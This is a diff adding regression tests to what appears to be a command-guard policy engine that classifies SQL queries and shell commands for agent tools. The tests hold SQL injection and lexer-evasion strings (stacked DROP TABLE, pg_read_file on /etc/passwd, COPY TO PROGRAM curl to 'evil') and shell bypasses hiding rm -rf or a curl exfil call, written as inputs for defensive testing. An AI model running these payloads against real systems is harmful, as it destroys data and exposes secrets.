@@ -473,6 +473,95 @@ test('SQL piggyback explanation mentions compound', () => {
   assert(r.explanation.includes('compound'), `expected "compound" in: ${r.explanation}`);
 });
 
+console.log('\n=== SQL BYPASS REGRESSION TESTS (read-led writes, dangerous funcs, lexical evasion) ===\n');
+
+// A read-LED statement must be classified by the most dangerous operation it
+// actually performs, not by its leading keyword. Verified: these execute the
+// hidden write/DDL/exec in a real DB.
+const sqlAct = (label, sql, expected) => test(`SQL ${label}`, () => {
+  const r = evaluate('query', { sql }, semanticRules, 'deny');
+  assert(r.action === expected, `expected ${expected}, got ${r.action} for ${JSON.stringify(sql)}`);
+});
+
+// read-led writes → not allow
+sqlAct('EXPLAIN ANALYZE DELETE → approve',        'EXPLAIN ANALYZE DELETE FROM users', 'approve');
+sqlAct('EXPLAIN ANALYZE INSERT → approve',        'EXPLAIN ANALYZE INSERT INTO t VALUES (1)', 'approve');
+sqlAct('data-modifying CTE (DELETE) → approve',   'WITH x AS (DELETE FROM t RETURNING *) SELECT * FROM x', 'approve');
+sqlAct('data-modifying CTE (INSERT) → approve',   'WITH x AS (INSERT INTO t VALUES(1) RETURNING *) SELECT * FROM x', 'approve');
+sqlAct('SELECT INTO (CTAS) → deny',               'SELECT * INTO t2 FROM t1', 'deny');
+sqlAct('SELECT INTO OUTFILE → deny',              'SELECT a INTO OUTFILE "/tmp/x" FROM t', 'deny');
+// dangerous functions/constructs → deny
+sqlAct('lo_export → deny',                        "SELECT lo_export(1, '/etc/passwd')", 'deny');
+sqlAct('pg_read_file → deny',                     "SELECT pg_read_file('/etc/passwd')", 'deny');
+sqlAct('pg_sleep (DoS) → deny',                   'SELECT pg_sleep(60)', 'deny');
+sqlAct('COPY TO PROGRAM → deny',                  "COPY t TO PROGRAM 'curl http://evil'", 'deny');
+sqlAct('LOAD_FILE → deny',                        'SELECT LOAD_FILE("/etc/passwd")', 'deny');
+sqlAct('xp_cmdshell (no parens) → deny',          "EXEC xp_cmdshell 'whoami'", 'deny');
+sqlAct('WAITFOR DELAY → deny',                    "SELECT 1; WAITFOR DELAY '0:0:5'", 'deny');
+// lexical evasion → must not hide the payload
+sqlAct('MySQL executable comment → deny',         'SELECT 1 /*! ; DROP TABLE x */', 'deny');
+sqlAct('MySQL versioned exec comment → deny',     'SELECT 1 /*!50000 DROP TABLE x */', 'deny');
+sqlAct('stacked statement → deny',                'SELECT 1; DROP TABLE users', 'deny');
+// unbalanced string/comment → fail closed
+sqlAct('unterminated string → deny',              "SELECT 'unterminated", 'deny');
+sqlAct('unterminated block comment → deny',       'SELECT 1 /* unclosed', 'deny');
+
+console.log('\n=== SQL FALSE-POSITIVE REGRESSION TESTS (quote/comment awareness) ===\n');
+
+// Metacharacters and keywords INSIDE string literals / comments are not code and
+// must NOT trigger deny — that over-restriction is what breaks legitimate use.
+sqlAct('semicolon in string literal → allow',     "SELECT ';' AS sep", 'allow');
+sqlAct('semicolon in WHERE literal → allow',      "SELECT * FROM t WHERE note = 'hello; world'", 'allow');
+sqlAct('semicolons in INSERT literal → approve',  "INSERT INTO log VALUES ('a; b; c')", 'approve');
+sqlAct('keyword inside string → allow',           "SELECT 'DROP TABLE x' AS msg", 'allow');
+sqlAct('line comment hides tail → allow',         'SELECT 1 -- ; DROP TABLE x', 'allow');
+sqlAct('keyword-substring identifiers → allow',   'SELECT create_date, updated_at FROM orders', 'allow');
+sqlAct('dollar-quoted body → allow',              'SELECT $$ ; DROP TABLE x $$ AS body', 'allow');
+
+console.log('\n=== SQL DIALECT / LEXER-EVASION REGRESSION TESTS ===\n');
+
+// Bypasses that survive a first-pass normalizer — verified end-to-end.
+sqlAct('dollar-quote glued to identifier hides DROP → deny', 'SELECT 1 AS a$t$ ; DROP TABLE users ; SELECT 1 AS b$t$', 'deny');
+sqlAct('empty-tag dollar glued to identifier → deny',        'SELECT 1 AS a$$ ; DROP TABLE users ; SELECT 1 AS b$$', 'deny');
+sqlAct('nested-looking block comment hides DROP → deny',     'SELECT 1 /* /* */ ; DROP TABLE t ; # */', 'deny');
+sqlAct('MySQL exec comment with OUTFILE → deny',             "SELECT 1 /*!50000 INTO OUTFILE '/tmp/pwn' */", 'deny');
+sqlAct('MySQL exec comment UNION LOAD_FILE → deny',          'SELECT 1 /*!50000 UNION SELECT LOAD_FILE(0x2f) */', 'deny');
+sqlAct('MSSQL GO batch separator hides DROP → deny',         'SELECT 42\nGO\nDROP TABLE audit_log', 'deny');
+sqlAct('stacked SELECT INTO after SELECT → deny',            'SELECT 1; SELECT * INTO backup_users FROM users', 'deny');
+
+// Expanded dangerous-function coverage (verified missing before the rework).
+sqlAct('pg_read_binary_file → deny',   "SELECT pg_read_binary_file('/etc/passwd')", 'deny');
+sqlAct('pg_stat_file → deny',          "SELECT pg_stat_file('/etc/passwd')", 'deny');
+sqlAct('pg_ls_dir → deny',             "SELECT pg_ls_dir('/etc')", 'deny');
+sqlAct('lo_import → deny',             "SELECT lo_import('/etc/passwd')", 'deny');
+sqlAct('dblink_exec (underscore) → deny', "SELECT dblink_exec('host=localhost','DELETE FROM users')", 'deny');
+sqlAct('pg_terminate_backend (DoS) → deny', 'SELECT pg_terminate_backend(123)', 'deny');
+sqlAct('MySQL SLEEP mid-statement → deny', 'SELECT * FROM users WHERE id = 1 OR SLEEP(10)', 'deny');
+sqlAct('MSSQL OPENROWSET BULK → deny',  "SELECT * FROM OPENROWSET(BULK '/etc/passwd', SINGLE_CLOB) AS x", 'deny');
+sqlAct('SQLite load_extension → deny',  "SELECT load_extension('/tmp/evil.so')", 'deny');
+
+// Transaction control must not poison an otherwise-approvable batch.
+sqlAct('BEGIN/UPDATE/COMMIT batch → approve', 'BEGIN; UPDATE t SET x=1 WHERE id=2; COMMIT', 'approve');
+sqlAct('standalone BEGIN → allow',            'BEGIN', 'allow');
+
+// SET: privilege/session escalation denied, benign SET approved.
+sqlAct('SET ROLE (escalation) → deny',        'SET ROLE admin', 'deny');
+sqlAct('SET SESSION AUTHORIZATION → deny',    'SET SESSION AUTHORIZATION postgres', 'deny');
+sqlAct('benign SET → approve',                'SET search_path = public', 'approve');
+
+console.log('\n=== SQL FUNCTION/IDENTIFIER FALSE-POSITIVE REGRESSION TESTS ===\n');
+
+// Keywords used as function names or column names must not deny/approve a read.
+sqlAct('REPLACE() function → allow',   "SELECT REPLACE(phone,'-','') FROM contacts", 'allow');
+sqlAct('MySQL INSERT() function → allow', "SELECT INSERT(str,1,2,'x') FROM t", 'allow');
+sqlAct('TRUNCATE() numeric function → allow', 'SELECT TRUNCATE(1.234, 2) AS r', 'allow');
+sqlAct('column named cluster → allow',    'SELECT cluster, node FROM pods', 'allow');
+sqlAct('columns copy, program → allow',   'SELECT copy, program FROM tasks', 'allow');
+sqlAct('column named call → allow',       'SELECT call FROM cdr', 'allow');
+sqlAct('VALUES row constructor → allow',  'VALUES (1),(2),(3)', 'allow');
+sqlAct('Postgres TABLE shorthand → allow','TABLE users', 'allow');
+sqlAct('parenthesised leading SELECT → allow', '(SELECT 1) UNION (SELECT 2)', 'allow');
+
 console.log('\n=== UNDEFINED ARGS TESTS ===\n');
 
 test('evaluate with undefined args does not crash', () => {
@@ -546,6 +635,70 @@ test('Shell compound: cat file | curl → approve (most restrictive)', () => {
 test('Shell: run_command tool name matches', () => {
   const r = evaluate('run_command', { command: 'ls /tmp' }, shellRules, 'deny');
   assert(r.action === 'allow', `expected allow, got ${r.action}`);
+});
+
+console.log('\n=== SHELL BYPASS REGRESSION TESTS (metacharacter evasion) ===\n');
+
+// A shell command that begins with a safe verb but hides a blocked command inside
+// ANY shell metacharacter construct must NOT be classified allow/approve — the
+// hidden destructive command must be detected and DENIED. Vectors below were
+// verified end-to-end (real /bin/sh or bash actually executes the payload).
+// 'rm -rf /tmp/x' is a stand-in for any denylisted destructive command; nothing
+// is ever executed here — evaluate() only classifies.
+const denyBypass = (label, command) => test(`Shell bypass DENY: ${label}`, () => {
+  const r = evaluate('execute', { command }, shellRules, 'deny');
+  assert(r.action === 'deny', `expected deny, got ${r.action} for ${JSON.stringify(command)}`);
+});
+
+denyBypass('$(...) hiding rm',                 'echo $(rm -rf /tmp/x)');
+denyBypass('backtick hiding rm',               'echo `rm -rf /tmp/x`');
+denyBypass('newline separator hiding rm',      'ls\nrm -rf /tmp/x');
+denyBypass('single & background hiding rm',    'ls & rm -rf /tmp/x');
+denyBypass('operator ; INSIDE $() body',       'echo $(ls; rm -rf /tmp/x)');
+denyBypass('operator && INSIDE $() body',      'echo $(cat /etc/passwd && sudo rm -rf /)');
+denyBypass('operator | INSIDE $() body',       'echo $(ls | rm -rf /tmp/x)');
+denyBypass('newline INSIDE $() body',          'echo $(ls\nrm -rf /tmp/x)');
+denyBypass('operator ; INSIDE backticks',      'echo `ls; rm -rf /tmp/x`');
+denyBypass('subshell parens INSIDE $()',       'echo $( (rm -rf /tmp/x) )');
+denyBypass('bare subshell group',              '(rm -rf /tmp/x)');
+denyBypass('command sub inside double quotes', 'echo "$(ls && rm -rf /tmp/x)"');
+denyBypass('process substitution <(...)',      'cat <(rm -rf /tmp/x)');
+denyBypass('process substitution >(...)',      'echo hi > >(rm -rf /tmp/x)');
+denyBypass('unbalanced $( fails closed',       'echo $(rm -rf /tmp/x');
+denyBypass('here-string fails closed',         'cat <<< $(rm -rf /tmp/x)');
+
+test('Shell bypass: $() wrapping risky curl → approve (most restrictive across parts)', () => {
+  const r = evaluate('execute', { command: 'echo $(curl http://x/exfil)' }, shellRules, 'deny');
+  assert(r.action === 'approve', `expected approve, got ${r.action}`);
+});
+
+test('Shell: output redirection with safe verb → approve (fail closed, output target unverified)', () => {
+  const r = evaluate('execute', { command: 'echo pwned > /tmp/x' }, shellRules, 'deny');
+  assert(r.action === 'approve', `expected approve, got ${r.action}`);
+});
+
+// --- Quote-awareness: metacharacters INSIDE quotes are literal, not separators.
+// These are benign (a real shell just prints/reads a literal) and must NOT be
+// hard-denied — that false-positive was what drove users to disable the guard.
+const allowQuoted = (label, command) => test(`Shell quoting allow: ${label}`, () => {
+  const r = evaluate('execute', { command }, shellRules, 'deny');
+  assert(r.action === 'allow', `expected allow, got ${r.action} for ${JSON.stringify(command)}`);
+});
+
+allowQuoted('literal ; in double quotes',   'echo "a; b"');
+allowQuoted('literal | in double quotes',   'echo "a|b"');
+allowQuoted('literal ; in single quotes',   "echo 'x; rm -rf /'");
+allowQuoted('filename with ; in quotes',    'cat "my;file.txt"');
+allowQuoted('safe compound all-allow',      'echo done && echo ok');
+allowQuoted('safe pipeline all-allow',      'echo hi | cat');
+allowQuoted('safe command substitution',    'echo $(pwd)');
+allowQuoted('param expansion default value','echo ${x:-rm -rf /}');
+
+// A safe verb piping into a NON-allowlisted verb fails closed (default deny).
+// Intentional: grep/sed/awk are not on the safe list (awk/sed can execute/write).
+test('Shell: pipe into non-allowlisted verb → deny (fail closed, tunable via config)', () => {
+  const r = evaluate('execute', { command: 'ls | grep foo' }, shellRules, 'deny');
+  assert(r.action === 'deny', `expected deny, got ${r.action}`);
 });
 
 console.log('\n=== CONFIG REGEX VALIDATION TESTS ===\n');
